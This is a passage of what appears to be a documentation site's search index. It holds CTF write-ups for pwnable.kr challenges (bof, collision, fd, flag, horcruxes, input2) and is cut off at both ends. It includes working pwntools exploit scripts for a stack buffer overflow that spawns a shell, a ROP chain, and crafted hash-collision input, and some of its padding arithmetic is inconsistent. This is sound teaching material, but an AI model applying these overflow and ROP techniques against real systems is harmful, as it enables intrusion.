passed as a parameter to <code>func()</code> and stored at <code>ebp + 0x8</code> (8 bytes above the base pointer).</p> </li> <li> <p>Critical Instructions:</p> </li> <li><code>gets(overflowme)</code>:<ul> <li>Reads user input directly into <code>overflowme</code> without size checks.</li> <li>Input longer than 32 bytes will overwrite adjacent memory, including the <code>key</code> variable.</li> </ul> </li> <li>Comparison:<ul> <li>The program checks if the <code>key</code> variable is equal to <code>0xcafebabe</code>:    <pre><code>cmpl 0xcafebabe,0x8(%ebp)\n</code></pre></li> <li>If the condition is true, the program calls <code>system(\"/bin/sh\")</code>.</li> </ul> </li> </ol>"},{"location":"pwnable.kr/pwnable-bufferOverflow/description/#exploit-analysis","title":"Exploit Analysis","text":"<p>To overwrite the <code>key</code> variable: 1. Fill the 32 bytes of <code>overflowme</code> to overflow the buffer. 2. Overwrite the 4 bytes of saved <code>ebp</code>. 3. Overwrite the 4 bytes of the return address (optional; not used in this challenge). 4. Write the value <code>0xcafebabe</code> to the memory location of <code>key</code> at <code>ebp + 0x8</code>.</p>"},{"location":"pwnable.kr/pwnable-bufferOverflow/description/#memory-layout","title":"Memory Layout","text":"Memory Address Content Offset <code>ebp - 0x2c</code> Start of <code>overflowme</code> +0 <code>ebp</code> Saved base pointer +0x2c <code>ebp + 0x4</code> Return address +0x30 <code>ebp + 0x8</code> <code>key</code> variable +0x34 <p>To overwrite the <code>key</code> variable, we need: - 32 bytes to fill <code>overflowme</code>. - 8 bytes (saved <code>ebp</code> + return address). - 4 bytes to write <code>0xcafebabe</code> to <code>key</code>. - </p>"},{"location":"pwnable.kr/pwnable-bufferOverflow/description/#crafting-the-payload","title":"Crafting the Payload","text":"<p>Using the above analysis, the payload structure is: 1. Padding for <code>overflowme</code>:    - 32 bytes (<code>'a' * 0x2c</code>). 2. Padding for <code>ebp</code> and return address:    - 8 bytes (<code>'b' * 0x08</code>). 3. Value for <code>key</code>:    - Write <code>0xcafebabe</code> in little-endian format (<code>\\xbe\\xba\\xfe\\xca</code>).</p>"},{"location":"pwnable.kr/pwnable-bufferOverflow/description/#python-exploit-script","title":"Python Exploit Script","text":"<p>Here\u2019s the Python script to exploit the challenge:</p> <pre><code>from pwn import *\n\n# Connect to the server\nconnection = remote(\"pwnable.kr\", 9000)\n\n# Construct the payload\noverflow_payload = b'a' * 0x2c       # Fill 32 bytes of overflowme\noverflow_payload += b'b' * 0x08      # Padding for saved ebp and return address\noverflow_payload += p32(0xcafebabe)  # Overwrite key with 0xcafebabe (little-endian)\n\n# Print the payload for verification\nprint(\"Payload:\", overflow_payload)\n\n# Send the payload to the server\nconnection.sendline(overflow_payload)\n\n# Interact with the shell\nconnection.interactive()\n</code></pre>"},{"location":"pwnable.kr/pwnable-bufferOverflow/description/#steps-to-execute-the-exploit","title":"Steps to Execute the Exploit","text":"<ol> <li>Analyze the Disassembly:</li> <li> <p>Use <code>objdump -D bof.c</code> to confirm the memory layout and validate the <code>overflowme</code> and <code>key</code> locations.</p> </li> <li> <p>Run the Script: <pre><code>python exploit.py\n</code></pre></p> </li> <li> <p>Observe the Shell:</p> </li> <li>If successful, the script overwrites <code>key</code> with <code>0xcafebabe</code>, triggering the shell:      <pre><code>$ whoami\n$ ls\n</code></pre> </li> </ol>"},{"location":"pwnable.kr/pwnable-bufferOverflow/description/#key-learnings","title":"Key Learnings","text":"<ol> <li>Buffer Overflow Basics:</li> <li> <p>Overwriting memory beyond the bounds of a buffer allows manipulation of other variables or control flow.</p> </li> <li> <p>Memory Layout Analysis:</p> </li> <li> <p>Understanding how variables are stored relative to the stack pointer and base pointer is crucial.</p> </li> <li> <p>Using Little-Endian Format:</p> </li> <li> <p>Most modern architectures store multi-byte values in little-endian order, so hex values must be reversed.</p> </li> <li> <p>Automating Exploits:</p> </li> <li>Tools like <code>pwntools</code> simplify the creation and execution of payloads for CTF challenges.</li> </ol>"},{"location":"pwnable.kr/pwnable-collisions/description/","title":"Description","text":""},{"location":"pwnable.kr/pwnable-collisions/description/#challenge-hash-collision","title":"Challenge: Hash Collision","text":""},{"location":"pwnable.kr/pwnable-collisions/description/#the-challenge-code","title":"The Challenge Code","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\nunsigned long hashcode = 0x21DD09EC;\nunsigned long check_password(const char* p){\n    int* ip = (int*)p;\n    int i;\n    int res=0;\n    for(i=0; i&lt;5; i++){\n        res += ip[i];\n    }\n    return res;\n}\n\nint main(int argc, char* argv[]){\n    if(argc&lt;2){\n        printf(\"usage : %s [passcode]\\n\", argv[0]);\n        return 0;\n    }\n    if(strlen(argv[1]) != 20){\n        printf(\"passcode length should be 20 bytes\\n\");\n        return 0;\n    }\n\n    if(hashcode == check_password(argv[1])){\n        system(\"/bin/cat flag\");\n        return 0;\n    }\n    else\n        printf(\"wrong passcode.\\n\");\n    return 0;\n}\n</code></pre>"},{"location":"pwnable.kr/pwnable-collisions/description/#challenge-objective","title":"Challenge Objective","text":"<p>To reveal the flag, the program requires: 1. A passcode passed as an argument. 2. The passcode must be exactly 20 bytes long. 3. The check_password() function must return a value equal to the predefined <code>hashcode</code> (0x21DD09EC).</p> <p>When these conditions are met, the program executes: <pre><code>system(\"/bin/cat flag\");\n</code></pre></p>"},{"location":"pwnable.kr/pwnable-collisions/description/#code-analysis","title":"Code Analysis","text":""},{"location":"pwnable.kr/pwnable-collisions/description/#check_password-function","title":"<code>check_password()</code> Function","text":"<ol> <li>Input Handling:</li> <li>Takes a <code>char*</code> parameter (a string of bytes).</li> <li>Treats the input as a series of integers by casting the pointer: <code>int* ip = (int*)p</code>.</li> <li> <p>This assumes the input string can be divided into 5 integers, each of 4 bytes.</p> </li> <li> <p>Summing Integers:</p> </li> <li> <p>Iterates through the array, summing up the 5 integers (4 bytes each) into a variable <code>res</code>.</p> </li> <li> <p>Return Value:</p> </li> <li>Returns the result of the summation.</li> </ol>"},{"location":"pwnable.kr/pwnable-collisions/description/#key-observations","title":"Key Observations:","text":"<ul> <li>Passcode Length:</li> <li>The program enforces a 20-byte input length:     <pre><code>if(strlen(argv[1]) != 20){\n</code></pre></li> <li> <p>This ensures that exactly 5 integers (4 bytes each) can be created from the input string.</p> </li> <li> <p>Hashcode Matching:</p> </li> <li>To pass the <code>if</code> check:     <pre><code>if(hashcode == check_password(argv[1])){\n</code></pre><ul> <li>The summation of the 5 integers must equal <code>0x21DD09EC</code>.</li> </ul> </li> </ul>"},{"location":"pwnable.kr/pwnable-collisions/description/#plan-to-solve","title":"Plan to Solve","text":"<p>To satisfy the condition <code>hashcode == check_password(argv[1])</code>, we need: 1. A 20-byte input that, when treated as 5 integers, sums up to <code>0x21DD09EC</code>. 2. Convert <code>hashcode</code> to decimal:    <pre><code>0x21DD09EC = 568134124\n</code></pre> 3. Distribute the Sum:    - Split <code>568134124</code> into 5 integers. One simple way is:      <pre><code>568134124 = (4 * 113626824) + 113626828\n</code></pre> 4. Convert to Hexadecimal:    - 113626824 = <code>0x6C5CEC8</code>    - 113626828 = <code>0x6C5CECC</code> 5. Convert to Little-Endian:    - In memory, integers are stored in little-endian format, so the bytes need to be reversed:      - <code>0x6C5CEC8</code> \u2192 <code>\\xC8\\xCE\\xC5\\x06</code>      - <code>0x6C5CECC</code> \u2192 <code>\\xCC\\xCE\\xC5\\x06</code></p> <ol> <li>Build the Input:</li> <li> <p>Construct a 20-byte input with 4 repetitions of <code>\\xC8\\xCE\\xC5\\x06</code> followed by <code>\\xCC\\xCE\\xC5\\x06</code>.</p> </li> <li> <p>Run the Program:</p> </li> <li>Use the crafted input to reveal the flag.</li> </ol>"},{"location":"pwnable.kr/pwnable-collisions/description/#step-by-step-solution","title":"Step-by-Step Solution","text":""},{"location":"pwnable.kr/pwnable-collisions/description/#step-1-convert-hashcode-to-decimal","title":"Step 1: Convert Hashcode to Decimal","text":"<p>The given <code>hashcode</code> is: <pre><code>0x21DD09EC = 568134124 (decimal)\n</code></pre></p>"},{"location":"pwnable.kr/pwnable-collisions/description/#step-2-split-into-5-integers","title":"Step 2: Split into 5 Integers","text":"<p>Divide the sum into 5 parts: <pre><code>568134124 = (4 * 113626824) + 113626828\n</code></pre></p>"},{"location":"pwnable.kr/pwnable-collisions/description/#step-3-convert-to-hexadecimal","title":"Step 3: Convert to Hexadecimal","text":"<p>Convert each integer into hexadecimal: - <code>113626824</code> = <code>0x6C5CEC8</code> - <code>113626828</code> = <code>0x6C5CECC</code></p>"},{"location":"pwnable.kr/pwnable-collisions/description/#step-4-convert-to-little-endian","title":"Step 4: Convert to Little-Endian","text":"<p>Convert the hex values into little-endian format: - <code>0x6C5CEC8</code> \u2192 <code>\\xC8\\xCE\\xC5\\x06</code> - <code>0x6C5CECC</code> \u2192 <code>\\xCC\\xCE\\xC5\\x06</code></p>"},{"location":"pwnable.kr/pwnable-collisions/description/#step-5-construct-the-input","title":"Step 5: Construct the Input","text":"<p>Create a 20-byte input: <pre><code>Input = \"\\xC8\\xCE\\xC5\\x06\" * 4 + \"\\xCC\\xCE\\xC5\\x06\"\n</code></pre></p>"},{"location":"pwnable.kr/pwnable-collisions/description/#step-6-execute-the-program","title":"Step 6: Execute the Program","text":"<p>Run the program with the crafted input: <pre><code>./col $(printf \"\\xcc\\xce\\xc5\\x06\\xcc\\xce\\xc5\\x06\\xcc\\xce\\xc5\\x06\\xcc\\xce\\xc5\\x06\\xc8\\xce\\xc5\\x06\")`\n</code></pre></p>"},{"location":"pwnable.kr/pwnable-collisions/description/#validation","title":"Validation","text":""},{"location":"pwnable.kr/pwnable-collisions/description/#why-this-works","title":"Why This Works","text":"<ol> <li>Sum of the Bytes:</li> <li>The first four integers are <code>113626824</code> each.</li> <li>The last integer is <code>113626828</code>.</li> <li> <p>Their sum is:      <pre><code>4 * 113626824 + 113626828 = 568134124 = 0x21DD09EC\n</code></pre></p> </li> <li> <p>Little-Endian Format:</p> </li> <li>The program treats the input as integers in little-endian format, so reversing the byte order ensures the values are interpreted correctly.</li> </ol>"},{"location":"pwnable.kr/pwnable-collisions/description/#output","title":"Output","text":"<p>If the input is correct, the program prints: <pre><code>&lt;contents of the flag&gt;\n</code></pre></p>"},{"location":"pwnable.kr/pwnable-collisions/description/#key-takeaways","title":"Key Takeaways","text":"<ol> <li>Understanding Little-Endian:</li> <li> <p>Knowing how integers are stored in memory is crucial for solving challenges involving binary representations.</p> </li> <li> <p>Hash Collision Technique:</p> </li> <li> <p>Dividing the hash value into parts that sum correctly is a common technique in CTFs.</p> </li> <li> <p>Memory Representation:</p> </li> <li>Casting strings to integers (<code>int* ip = (int*)p</code>) allows manipulation of raw memory, a frequent approach in binary challenges.</li> </ol>"},{"location":"pwnable.kr/pwnable-fd/description/","title":"Description","text":""},{"location":"pwnable.kr/pwnable-fd/description/#challenge-fdc","title":"Challenge: fd.c","text":""},{"location":"pwnable.kr/pwnable-fd/description/#challenge-description","title":"Challenge Description","text":"<p>In this challenge, we are provided with the following C code:</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nchar buf[32];\n\nint main(int argc, char* argv[], char* envp[]){\n    if(argc &lt; 2){\n        printf(\"pass argv[1] a number\\n\");\n        return 0;\n    }\n    int fd = atoi(argv[1]) - 0x1234;\n    int len = 0;\n    len = read(fd, buf, 32);\n    if(!strcmp(\"LETMEWIN\\n\", buf)){\n        printf(\"good job :)\\n\");\n        system(\"/bin/cat flag\");\n        exit(0);\n    }\n    printf(\"learn about Linux file IO\\n\");\n    return 0;\n}\n</code></pre> <p>Our goal is to get the program to execute <code>system(\"/bin/cat flag\")</code> and reveal the flag. To do this, we need to satisfy the conditions in the code and bypass the final <code>if</code> statement.</p>"},{"location":"pwnable.kr/pwnable-fd/description/#analyzing-the-code","title":"Analyzing the Code","text":"<ol> <li>Input Validation:</li> <li>The program expects one argument (<code>argv[1]</code>) in numeric form.</li> <li> <p>If no argument is passed, it will print:      <pre><code>pass argv[1] a number\n</code></pre></p> </li> <li> <p><code>fd</code> Calculation:</p> </li> <li>The program calculates <code>fd</code> (a file descriptor) as:      <pre><code>int fd = atoi(argv[1]) - 0x1234;\n</code></pre></li> <li><code>atoi(argv[1])</code>: Converts the input string (<code>argv[1]</code>) to an integer.</li> <li><code>0x1234</code>: This is a hexadecimal constant equal to 4660 in decimal.</li> <li> <p></p> </li> <li> <p><code>read(fd, buf, 32)</code>:</p> </li> <li> <p>The program reads 32 bytes from the file descriptor <code>fd</code> into the buffer <code>buf</code>.</p> </li> <li> <p>Condition Check:</p> </li> <li>The program compares the contents of <code>buf</code> with the string <code>\"LETMEWIN\\n\"</code>:      <pre><code>if (!strcmp(\"LETMEWIN\\n\", buf))\n</code></pre></li> <li>If the contents match, it prints <code>\"good job :)\"</code> and executes:      <pre><code>system(\"/bin/cat flag\")\n</code></pre> </li> </ol>"},{"location":"pwnable.kr/pwnable-fd/description/#objective","title":"Objective","text":"<p>To capture the flag, we need to satisfy: 1. <code>fd == 0</code>: This ensures <code>read(fd, buf, 32)</code> reads from standard input (<code>stdin</code>).    - This is achieved when:      <pre><code>atoi(argv[1]) - 0x1234 == 0\n</code></pre>    - Simplifying:      <pre><code>atoi(argv[1]) == 0x1234\n</code></pre></p> <ol> <li>Input the Correct String:</li> <li>After the program reads from <code>stdin</code>, we need to input:      <pre><code>LETMEWIN\n</code></pre></li> </ol>"},{"location":"pwnable.kr/pwnable-fd/description/#solution-steps","title":"Solution Steps","text":"<ol> <li>Determine the Value of <code>argv[1]</code>:</li> <li> <p>The program expects <code>atoi(argv[1]) == 0x1234</code>. Since <code>argv[1]</code> is passed as a decimal string, we need to convert <code>0x1234</code> (hexadecimal) to decimal:      <pre><code>0x1234 = 4660 (decimal)\n</code></pre></p> </li> <li> <p>Run the Program with the Correct Argument:</p> </li> <li> <p>Execute the program with <code>4660</code> as the argument:      <pre><code>./fd 4660\n</code></pre></p> </li> <li> <p>Provide the Correct Input:</p> </li> <li> <p>The program will now read from standard input. Provide the string <code>\"LETMEWIN\"</code> followed by a newline (<code>\\n</code>):      <pre><code>LETMEWIN\n</code></pre></p> </li> <li> <p>Capture the Flag:</p> </li> <li>If the conditions are met, the program will print:      <pre><code>good job :)\n</code></pre></li> <li>It will then execute <code>system(\"/bin/cat flag\")</code>, revealing the flag.</li> </ol>"},{"location":"pwnable.kr/pwnable-fd/description/#walkthrough","title":"Walkthrough","text":"<ol> <li> <p>Run the Program Without Arguments: <pre><code>./fd\n</code></pre>    Output:    <pre><code>pass argv[1] a number\n</code></pre></p> </li> <li> <p>Run the Program with the Correct Argument: <pre><code>./fd 4660\n</code></pre>    The program waits for input.</p> </li> <li> <p>Provide the Correct Input: <pre><code>LETMEWIN\n</code></pre>    Output:    <pre><code>good job :)\n&lt;flag&gt;\n</code></pre></p> </li> </ol>"},{"location":"pwnable.kr/pwnable-fd/description/#key-takeaways","title":"Key Takeaways","text":"<ul> <li>Understanding <code>atoi</code>: <code>atoi</code> converts a string into an integer, making it essential to convert hexadecimal values to decimal for correct input.</li> <li>File Descriptor 0 (<code>stdin</code>): The value <code>fd = 0</code> maps to standard input, allowing the program to read user input for further processing.</li> <li>Hexadecimal Conversion: Always convert hexadecimal values to decimal if the input is expected as a numeric string.</li> </ul>"},{"location":"pwnable.kr/pwnable-fd/description/#additional-notes","title":"Additional Notes","text":"<ul> <li>If the program uses other file descriptors (e.g., for files or sockets), the approach may vary.</li> <li>Learn more about Linux file I/O and system calls to understand how <code>read()</code> and <code>system()</code> interact.</li> </ul>"},{"location":"pwnable.kr/pwnable-flag/description/","title":"Description","text":""},{"location":"pwnable.kr/pwnable-flag/description/#challenge-4-flag-binary","title":"Challenge 4: Flag Binary","text":""},{"location":"pwnable.kr/pwnable-flag/description/#challenge-description","title":"Challenge Description","text":"<p>For this challenge, we are provided with a binary file that can be downloaded from: http://pwnable.kr/bin/flag</p> <p>The goal of this challenge is to learn basic binary reverse engineering techniques to extract the hidden flag.</p>"},{"location":"pwnable.kr/pwnable-flag/description/#step-by-step-solution","title":"Step-by-Step Solution","text":""},{"location":"pwnable.kr/pwnable-flag/description/#step-1-analyze-the-file","title":"Step 1: Analyze the File","text":"<p>The first step when dealing with a binary file is to identify its type and check whether it is compressed, packed, or protected.</p>"},{"location":"pwnable.kr/pwnable-flag/description/#command","title":"Command:","text":"<pre><code>file flag\n</code></pre>"},{"location":"pwnable.kr/pwnable-flag/description/#output-example","title":"Output (example):","text":"<p><pre><code>flag: UPX compressed, x86-64\n</code></pre> </p>"},{"location":"pwnable.kr/pwnable-flag/description/#analysis","title":"Analysis:","text":"<p>The output indicates that the file is packed with UPX, a popular executable packer. Packed binaries are compressed to reduce size or obfuscate the content, and they must be unpacked before further analysis.</p>"},{"location":"pwnable.kr/pwnable-flag/description/#step-2-check-for-embedded-strings","title":"Step 2: Check for Embedded Strings","text":"<p>Next, use the <code>strings</code> command to extract readable strings from the binary. This is a quick way to look for hints or information like the flag.</p>"},{"location":"pwnable.kr/pwnable-flag/description/#command_1","title":"Command:","text":"<pre><code>strings flag\n</code></pre>"},{"location":"pwnable.kr/pwnable-flag/description/#output","title":"Output:","text":"<ul> <li>At this point, the output may contain very few readable strings or garbage data, as the file is still packed.</li> <li>However, scrolling to the bottom might reveal <code>UPX! UPX!</code>.</li> </ul>"},{"location":"pwnable.kr/pwnable-flag/description/#analysis_1","title":"Analysis:","text":"<p>The <code>UPX! UPX!</code> string confirms that the binary is packed with UPX. We need to unpack it to proceed further. </p>"},{"location":"pwnable.kr/pwnable-flag/description/#step-3-unpack-the-binary","title":"Step 3: Unpack the Binary","text":"<p>To unpack the binary, use the UPX unpacking tool.</p>"},{"location":"pwnable.kr/pwnable-flag/description/#command_2","title":"Command:","text":"<pre><code>upx -d flag\n</code></pre>"},{"location":"pwnable.kr/pwnable-flag/description/#output_1","title":"Output:","text":"<p><pre><code>Ultimate Packer for eXecutables\nUnpacked 1 file: flag\n</code></pre> </p>"},{"location":"pwnable.kr/pwnable-flag/description/#analysis_2","title":"Analysis:","text":"<p>The binary has now been unpacked. This means we can analyze its original content without the obfuscation caused by packing.</p>"},{"location":"pwnable.kr/pwnable-flag/description/#step-4-recheck-for-strings","title":"Step 4: Recheck for Strings","text":"<p>Now that the binary is unpacked, re-run the <code>strings</code> command to search for readable content, including any potential flags.</p>"},{"location":"pwnable.kr/pwnable-flag/description/#command_3","title":"Command:","text":"<pre><code>strings flag\n</code></pre>"},{"location":"pwnable.kr/pwnable-flag/description/#expected-output","title":"Expected Output:","text":"<ul> <li>The unpacked binary should now reveal readable strings. However, the flag may not be directly visible.</li> </ul>"},{"location":"pwnable.kr/pwnable-flag/description/#step-5-search-for-the-flag","title":"Step 5: Search for the Flag","text":"<p>To filter for potential flag-related content, use the <code>grep</code> command to look for relevant keywords like <code>flag</code>.</p>"},{"location":"pwnable.kr/pwnable-flag/description/#command_4","title":"Command:","text":"<pre><code>strings flag | grep flag\n</code></pre>"},{"location":"pwnable.kr/pwnable-flag/description/#output-example_1","title":"Output (example):","text":"<pre><code>FLAG{this_is_the_hidden_flag}\n</code></pre> <p>If the flag is not revealed: 1. Experiment with other keywords (e.g., <code>UPX</code> or other hints from the <code>strings</code> output). 2. Example:    <pre><code>strings flag | grep UPX\n</code></pre></p>"},{"location":"pwnable.kr/pwnable-flag/description/#analysis_3","title":"Analysis:","text":"<p>The flag may be embedded in the binary but obfuscated in a specific way. If the above commands don't work, move to further analysis techniques like reverse engineering.</p>"},{"location":"pwnable.kr/pwnable-flag/description/#optional-decompile-the-binary","title":"Optional: Decompile the Binary","text":"<p>If the flag is not found using <code>strings</code>, the next step is to reverse engineer the binary to understand its behavior and locate the flag. Tools like <code>Ghidra</code> or <code>radare2</code> can be used.</p>"},{"location":"pwnable.kr/pwnable-flag/description/#using-ghidra","title":"Using Ghidra:","text":"<ol> <li>Load the binary into Ghidra.</li> <li>Analyze the disassembled code to identify:</li> <li>Hardcoded strings.</li> <li>System calls (e.g., <code>printf</code>, <code>puts</code>, <code>system</code>).</li> <li>Hidden logic where the flag might be generated or stored.</li> </ol>"},{"location":"pwnable.kr/pwnable-flag/description/#using-radare2","title":"Using Radare2:","text":"<ol> <li>Open the binary in radare2:    <pre><code>r2 -A flag\n</code></pre></li> <li>Analyze the functions:    <pre><code>afl\n</code></pre></li> <li>Explore strings:    <pre><code>iz\n</code></pre></li> </ol>"},{"location":"pwnable.kr/pwnable-flag/description/#final-steps","title":"Final Steps","text":"<ol> <li>After locating the flag using <code>strings</code>, <code>grep</code>, or reverse engineering:</li> <li>Copy the flag in the required format (e.g., <code>FLAG{...}</code>).</li> <li>Submit the flag to complete the challenge.</li> </ol>"},{"location":"pwnable.kr/pwnable-flag/description/#key-takeaways","title":"Key Takeaways","text":"<ul> <li>File Analysis:</li> <li>Always begin by identifying the file type and format using tools like <code>file</code>.</li> <li>Packed Binaries:</li> <li>If the file is packed (e.g., with UPX), unpack it first to reveal its true content.</li> <li>String Extraction:</li> <li>Use <code>strings</code> to extract readable content and combine it with tools like <code>grep</code> to filter for relevant keywords.</li> <li>Reverse Engineering:</li> <li>For more complex challenges, use tools like <code>Ghidra</code> or <code>radare2</code> to disassemble and analyze the binary.</li> </ul>"},{"location":"pwnable.kr/pwnable-horcruxes/description/","title":"Description","text":""},{"location":"pwnable.kr/pwnable-horcruxes/description/#challenge-horcruxes","title":"Challenge: Horcruxes","text":""},{"location":"pwnable.kr/pwnable-horcruxes/description/#challenge-overview","title":"Challenge Overview","text":"<p>We are given a binary named <code>horcruxes</code>, and our goal is to retrieve the flag by exploiting the binary through Return-Oriented Programming (ROP).</p>"},{"location":"pwnable.kr/pwnable-horcruxes/description/#initial-observations","title":"Initial Observations","text":"<p>Upon running the binary, it presents the following menu:</p> <pre><code>Select menu :\n</code></pre> <p>Writing something prompts for input:</p> <pre><code>How much exp did you get?\n</code></pre> <p>From analyzing the disassembled binary, the function <code>ropme</code> handles this input. Our main observations:</p> <ol> <li>Vulnerable Input Handling:</li> <li> <p>The function uses <code>gets()</code>, which is vulnerable to buffer overflow, allowing us to overwrite the return address.</p> </li> <li> <p>Initialization of Horcruxes:</p> </li> <li>The function <code>init_ABCDEFG()</code> initializes seven functions randomly, named <code>A, B, C, D, E, F, G</code>, and stores their values.</li> <li> <p>Expected output: </p> </li> <li> <p>ROP Attack Hints:</p> </li> <li>The function name <code>ropme</code> suggests that the challenge requires using Return-Oriented Programming (ROP) to redirect execution.</li> </ol>"},{"location":"pwnable.kr/pwnable-horcruxes/description/#step-1-identifying-vulnerabilities","title":"Step 1: Identifying Vulnerabilities","text":""},{"location":"pwnable.kr/pwnable-horcruxes/description/#analyzing-the-ropme-function","title":"Analyzing the <code>ropme</code> function","text":"<p>Disassembling the binary with <code>objdump</code> or <code>Ghidra</code>, we can confirm:</p> <ul> <li>Two <code>gets()</code> calls are present.</li> <li>The return value is compared against the sum of horcruxes.</li> <li>Buffer size is 120 bytes, meaning anything beyond this overwrites the saved return pointer.</li> </ul> <p>Expected output: </p>"},{"location":"pwnable.kr/pwnable-horcruxes/description/#step-2-gathering-function-addresses","title":"Step 2: Gathering Function Addresses","text":"<p>Using <code>objdump</code> to extract function addresses:</p> <pre><code>objdump -D horcruxes | grep \"&lt;A&gt;\"\n</code></pre> <p>Expected output: </p> <p>Similarly, find the <code>ropme</code> function:</p> <pre><code>objdump -D horcruxes | grep \"&lt;ropme&gt;\"\n</code></pre> <p>Addresses identified:</p> <ul> <li>A: <code>0x080485cb</code></li> <li>B: <code>0x080485f8</code></li> <li>C: <code>0x08048625</code></li> <li>D: <code>0x08048652</code></li> <li>E: <code>0x0804867f</code></li> <li>F: <code>0x080486ac</code></li> <li>G: <code>0x080486d9</code></li> <li>Ropme: <code>0x08048706</code></li> </ul>"},{"location":"pwnable.kr/pwnable-horcruxes/description/#step-3-constructing-the-payload","title":"Step 3: Constructing the Payload","text":"<p>We will construct a payload to:</p> <ol> <li>Fill the buffer (<code>120</code> bytes).</li> <li>Overwrite the return address to call functions <code>A</code> to <code>G</code>.</li> <li>Redirect execution back to <code>ropme</code> for final input.</li> </ol>"},{"location":"pwnable.kr/pwnable-horcruxes/description/#step-4-finding-the-buffer-overflow-offset","title":"Step 4: Finding the Buffer Overflow Offset","text":"<p>Through trial-and-error or debugging (<code>gdb</code>):</p> <pre><code>python -c 'print(\"A\" * 120)' | ./horcruxes\n</code></pre> <p>Once buffer overflow is confirmed, proceed with constructing the payload.</p>"},{"location":"pwnable.kr/pwnable-horcruxes/description/#step-5-creating-the-exploit-script","title":"Step 5: Creating the Exploit Script","text":"<pre><code># Function addresses (in little-endian format)\nA = p32(0x080485cb)\nB = p32(0x080485f8)\nC = p32(0x08048625)\nD = p32(0x08048652)\nE = p32(0x0804867f)\nF = p32(0x080486ac)\nG = p32(0x080486d9)\nROP_ME = p32(0x08048706)\n\n# Constructing the payload\npayload = b\"A\" * 120  # Buffer overflow to reach EIP\npayload += A + B + C + D + E + F + G  # Call functions in sequence\npayload += ROP_ME  # Jump back to ropme to input the correct sum\n\n# Start process\np = process(binary_path)\n\n# Interact with the binary menu\np.recvuntil(b\"&gt;&gt; \")\np.sendline(b\"1\")  # Select play option\n\n# Send the payload to trigger ROP\np.sendline(payload)\n\n# Calculate the correct sum of horcrux values manually or script it\ncorrect_sum = str((0x080485cb + 0x080485f8 + 0x08048625 +\n                   0x08048652 + 0x0804867f + 0x080486ac + 0x080486d9) % (2**32))\n\np.sendline(correct_sum.encode())\n\n# Get the flag output\nprint(p.recvall().decode())\n</code></pre>"},{"location":"pwnable.kr/pwnable-horcruxes/description/#step-6-explanation-of-the-exploit","title":"Step 6: Explanation of the Exploit","text":"<ol> <li>Overflow the Buffer: </li> <li> <p>Fill with 120 bytes to overwrite the saved return pointer.</p> </li> <li> <p>Chained Function Calls: </p> </li> <li>Place the addresses of <code>A</code> to <code>G</code> sequentially.</li> <li> <p>Each function is called and adds its value to the stored sum.</p> </li> <li> <p>Return to <code>ropme</code>: </p> </li> <li> <p>Once all functions have executed, return to <code>ropme</code> for input.</p> </li> <li> <p>Input Correct Sum: </p> </li> <li>Provide the correct sum calculated from function values.</li> </ol>"},{"location":"pwnable.kr/pwnable-horcruxes/description/#step-7-running-the-exploit","title":"Step 7: Running the Exploit","text":"<ol> <li>Save the script as <code>exploit.py</code>.</li> <li>Run the exploit:    <pre><code>python exploit.py\n</code></pre></li> <li>Expected output:    <pre><code>Toddler's Secure ROP Level\n&gt;&gt; 1\nHow much exp did you get?\nCongratz!\nFLAG{...}\n</code></pre></li> </ol>"},{"location":"pwnable.kr/pwnable-horcruxes/description/#key-takeaways","title":"Key Takeaways","text":"<ol> <li>Understanding ROP:</li> <li> <p>The challenge introduces Return-Oriented Programming by allowing us to chain function calls by overwriting the return address.</p> </li> <li> <p>Buffer Overflow Exploitation:</p> </li> <li> <p>Overflowing buffers to manipulate the return address can redirect control flow.</p> </li> <li> <p>Manual Exploit Construction:</p> </li> <li>Identifying function addresses using <code>objdump</code>.</li> <li>Calculating offsets and chaining function calls.</li> </ol>"},{"location":"pwnable.kr/pwnable-horcruxes/description/#possible-mitigations","title":"Possible Mitigations","text":"<p>In a real-world scenario, mitigations include:</p> <ol> <li>Stack Canaries: Prevent buffer overflows.</li> <li>ASLR (Address Space Layout Randomization): Randomizes memory addresses.</li> <li>Non-Executable Stack: Prevents execution of injected code.</li> <li>RELRO (Relocation Read-Only): Protects function pointers.</li> </ol>"},{"location":"pwnable.kr/pwnable-input/description/","title":"Description","text":""},{"location":"pwnable.kr/pwnable-input/description/#challenge-7-input2-solution-walkthrough","title":"Challenge 7: input2 Solution Walkthrough","text":""},{"location":"pwnable.kr/pwnable-input/description/#objective","title":"Objective","text":"<p>The goal of this challenge is to provide specific inputs through various input methods, including:</p> <ol> <li>Command-line arguments (ARGV)</li> <li>Standard input/output (STDIN/STDERR)</li> <li>Environment variables (ENV)</li> <li>File manipulation</li> <li>Network connection (TCP)</li> </ol> <p>To successfully complete the challenge, each input method must meet the conditions imposed by the binary.</p>"},{"location":"pwnable.kr/pwnable-input/description/#step-1-setting-up-argv-command-line-arguments","title":"Step 1: Setting up ARGV (Command-line Arguments)","text":""},{"location":"pwnable.kr/pwnable-input/description/#conditions","title":"Conditions:","text":"<p>The binary expects: 1. <code>argv</code> array should contain 100 elements. 2. <code>argv['A']</code> (65th index) should be set to <code>\\x00</code>. 3. <code>argv['B']</code> (66th index) should be set to <code>\\x20\\x0a\\x0d</code> (space, newline, carriage return).</p>"},{"location":"pwnable.kr/pwnable-input/description/#solution","title":"Solution:","text":"<pre><code>char *new_argv[101];  // Declare 100 elements + NULL\n\n// Fill argv with empty strings\nfor (int i = 0; i &lt; 100; i++) {\n    new_argv[i] = \"\";\n}\n\n// Add required elements\nnew_argv['A'] = \"\\x00\";  // ASCII for 'A' = 65, NULL byte required\nnew_argv['B'] = \"\\x20\\x0a\\x0d\";  // ASCII for 'B' = 66, inject required sequence\n\n// Null-terminate the argv array\nnew_argv[100] = NULL;\n</code></pre>"},{"location":"pwnable.kr/pwnable-input/description/#step-2-handling-standard-inputoutput-stdinstderr","title":"Step 2: Handling Standard Input/Output (STDIN/STDERR)","text":""},{"location":"pwnable.kr/pwnable-input/description/#conditions_1","title":"Conditions:","text":"<p>The binary reads from standard input and error and expects: - <code>stdin</code> to contain: <code>\\x00\\x0a\\x00\\xff</code> - <code>stderr</code> to contain: <code>\\x00\\x0a\\x02\\xff</code></p>"},{"location":"pwnable.kr/pwnable-input/description/#solution_1","title":"Solution:","text":"<pre><code>// Create and write to files for stdin and stderr redirection\nint new_stdin = open(\"./first\", O_RDWR | O_CREAT, 00777);\nwrite(new_stdin, \"\\x00\\x0a\\x00\\xff\", 4);\n\nint new_stderr = open(\"./second\", O_RDWR 